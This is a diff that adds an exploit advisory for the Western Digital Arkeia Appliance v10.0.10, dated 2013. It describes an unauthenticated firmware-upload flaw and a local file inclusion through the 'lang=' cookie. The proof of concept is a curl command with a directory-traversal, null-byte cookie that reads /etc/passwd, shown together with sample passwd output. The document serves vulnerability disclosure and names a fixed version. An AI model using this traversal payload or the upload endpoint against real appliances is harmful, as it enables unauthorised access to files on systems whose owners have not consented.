@@ -1,0 +1,43 @@
+###################################################################################################################################
+# Exploit Title: Western Digital Arkeia Appliance v10.0.10
+# Date: Sep 17 2013
+# Exploit Author: xistence < xistence[at]0x90[.]nl >
+# Vendor Homepage: www.arkeia.com
+# Tested on: Virtual Appliance - ESXi 5.1
+# Affected Version : v10.0.10 and lower
+# Link: ftp://ftp.arkeia.com/arkeia-virtual-appliance/vmware-virtual-appliance/full-virtual-appliance/arkeia_virtual_appliance-10.0.10.zip
+# Fix: Upgrade to version 10.1.10
+#
+###################################################################################################################################
+
+Arkeia Appliance v10.0.10 is prone to 2 security vulnerabilties: 
+
+1) Unauthenticated firmware upload 
+
+There are no restrictions when a POST request is send to http://<IP>/scripts/upload.php thus allowing any 
+unauthenticated client to upload any data to the /tmp/ApplianceUpdate file. 
+
+2) Local File Inclusion (LFI) vulnerability in the cookie "lang=" 
+
+By sending a request (without the need for authentication) to the homepage of the appliance with a cookie "lang=../../../../../../../../../../../../../../../../etc/passwd%00", 
+it's possible to read files on the server, in this example /etc/passwd. 
+
+Proof of Concept 
+Run the following command: 
+curl --cookie "lang=../../../../../../../../../../../../../../../../etc/passwd%00" http://<IP>/ 
+
+Which will return the /etc/passwd: 
+
+root:x:0:0:root:/root:/bin/bash 
+bin:x:1:1:bin:/bin:/sbin/nologin 
+daemon:x:2:2:daemon:/sbin:/sbin/nologin 
+adm:x:3:4:adm:/var/adm:/sbin/nologin 
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin 
+sync:x:5:0:sync:/sbin:/bin/sync 
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 
+halt:x:7:0:halt:/sbin:/sbin/halt 
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin 
+uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin 
+operator:x:11:0:operator:/root:/sbin/nologin 
+[..snip..]
+
